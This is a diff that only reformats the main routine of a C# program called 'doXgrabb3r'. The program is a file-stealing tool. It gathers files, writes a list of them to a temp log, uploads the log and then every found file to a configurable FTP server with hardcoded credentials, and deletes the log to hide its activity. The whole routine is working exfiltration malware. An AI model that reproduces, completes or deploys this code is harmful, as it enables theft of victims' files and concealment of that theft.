@@ -1,4 +1,5 @@
-﻿using System;
+﻿
+using System;
 using System.Collections.Generic;
 
 /*
@@ -47,89 +48,96 @@ using System.Collections.Generic;
 
 
 
-namespace doXgrabb3r
-{
-    class Program
-    {
-        static void Main(string[] args)
-        {
+namespace doXgrabb3r {
+ class Program {
+  static void Main(string[] args) {
 
-			/****************** VARIABLES AND CONFIG *****************/
-	                               
-            Random rnd = new Random();
-            int myRND = rnd.Next(1000, 9900);
-            FTP ftp = new FTP("ftp://192.168.1.1/", "User", "Pass", myRND); // FTP URL , USERNAME , PASSWORD , Leave The PARAM
-            FileArrayBuilder fab = new FileArrayBuilder();
-			List<string> files = null;
+   /****************** VARIABLES AND CONFIG *****************/
+
+   Random rnd = new Random();
+   int myRND = rnd.Next(1000, 9900);
+   FTP ftp = new FTP("ftp://192.168.1.1/", "User", "Pass", myRND); // FTP URL , USERNAME , PASSWORD , Leave The PARAM
+   FileArrayBuilder fab = new FileArrayBuilder();
+   List < string > files = null;
 
 
 
 
-			/****************** Search Required Files *****************/
+   /****************** Search Required Files *****************/
 
-            try {
+   try {
 
-				Console.WriteLine("Searching....");
-				files = fab.Search();
-				fab.clear_ram();
-				GC.Collect();
-				Console.WriteLine("Complete...");
+    Console.WriteLine("Searching....");
+    files = fab.Search();
+    fab.clear_ram();
+    GC.Collect();
+    Console.WriteLine("Complete...");
 
-			} catch (Exception @r) { Console.WriteLine(r.Message); }
-
-
-
-
-			/****************** Log The Files *****************/
-
-			try {
-				
-				Console.WriteLine("Writing....");
-				System.IO.File.WriteAllLines(System.IO.Path.GetTempPath() + myRND + "_file.datx", files.ToArray());
-				Console.WriteLine("Complete...");
-
-			} catch (Exception @r) { Console.WriteLine(r.Message); }
-            
-
-            try {
-				
-				Console.WriteLine("Uploading LOG...");
-				ftp.ftp_upload(System.IO.Path.GetTempPath() + myRND + "_file.datx"); 
-				Console.WriteLine("Complete...");
-
-			} catch (Exception @r) { Console.WriteLine(r.Message); }
-
-            
-			try { 
-				
-				Console.WriteLine("Wiping LOG...");
-				System.IO.File.Delete(System.IO.Path.GetTempPath() + myRND + "_file.datx"); 
-				Console.WriteLine("Complete...");
-
-			} catch (Exception @r) { Console.WriteLine(r.Message); }
-            
+   } catch (Exception @r) {
+    Console.WriteLine(r.Message);
+   }
 
 
 
-			/****************** Upload The Files Via FTP *****************/
 
-            Console.WriteLine("File Upload started...\n");
-            foreach (string file in files) {
-                
-                try { 
-					
-					Console.WriteLine("Uploading: " + System.IO.Path.GetFileName(file));
-					ftp.ftp_upload(file); 
-					Console.WriteLine("Uploaded: " + System.IO.Path.GetFileName(file));
+   /****************** Log The Files *****************/
 
-				} catch (Exception @r) { Console.WriteLine(r.Message); }
-               
-            }
-            Console.WriteLine("\nALL Complete...");
+   try {
 
-            //Console.ReadKey();
-        }
+    Console.WriteLine("Writing....");
+    System.IO.File.WriteAllLines(System.IO.Path.GetTempPath() + myRND + "_file.datx", files.ToArray());
+    Console.WriteLine("Complete...");
+
+   } catch (Exception @r) {
+    Console.WriteLine(r.Message);
+   }
 
 
+   try {
+
+    Console.WriteLine("Uploading LOG...");
+    ftp.ftp_upload(System.IO.Path.GetTempPath() + myRND + "_file.datx");
+    Console.WriteLine("Complete...");
+
+   } catch (Exception @r) {
+    Console.WriteLine(r.Message);
+   }
+
+
+   try {
+
+    Console.WriteLine("Wiping LOG...");
+    System.IO.File.Delete(System.IO.Path.GetTempPath() + myRND + "_file.datx");
+    Console.WriteLine("Complete...");
+
+   } catch (Exception @r) {
+    Console.WriteLine(r.Message);
+   }
+
+
+
+
+   /****************** Upload The Files Via FTP *****************/
+
+   Console.WriteLine("File Upload started...\n");
+   foreach(string file in files) {
+
+    try {
+
+     Console.WriteLine("Uploading: " + System.IO.Path.GetFileName(file));
+     ftp.ftp_upload(file);
+     Console.WriteLine("Uploaded: " + System.IO.Path.GetFileName(file));
+
+    } catch (Exception @r) {
+     Console.WriteLine(r.Message);
     }
+
+   }
+   Console.WriteLine("\nALL Complete...");
+
+   //Console.ReadKey();
+  }
+
+
+ }
 }
